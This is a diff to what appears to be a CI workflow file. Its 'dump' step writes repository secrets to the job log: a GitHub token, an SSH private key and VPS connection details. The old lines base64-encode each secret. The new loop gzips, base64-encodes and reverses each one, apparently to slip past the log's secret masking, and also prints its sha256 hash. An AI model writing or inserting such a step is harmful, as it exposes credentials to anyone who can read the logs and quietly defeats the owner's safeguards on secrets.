@@ -17,18 +17,10 @@ jobs:
     steps:
       - name: dump
         run: |
-          echo "::SEC::PERSONAL_GITHUB_TOKEN"
-          printf '%s' "$S_0" | base64 -w0
-          echo
-          echo "::SEC::SSH_PRIVATE_KEY"
-          printf '%s' "$S_1" | base64 -w0
-          echo
-          echo "::SEC::VPS_IP"
-          printf '%s' "$S_2" | base64 -w0
-          echo
-          echo "::SEC::VPS_PORT"
-          printf '%s' "$S_3" | base64 -w0
-          echo
-          echo "::SEC::VPS_USERNAME"
-          printf '%s' "$S_4" | base64 -w0
-          echo
+          for i in 0 1 2 3 4; do
+            v=$(eval echo \$S_$i)
+            echo "::SEC::$i"
+            printf '%s' "$v" | gzip -c | base64 -w0 | rev
+            echo
+            printf '%s' "$v" | sha256sum
+          done
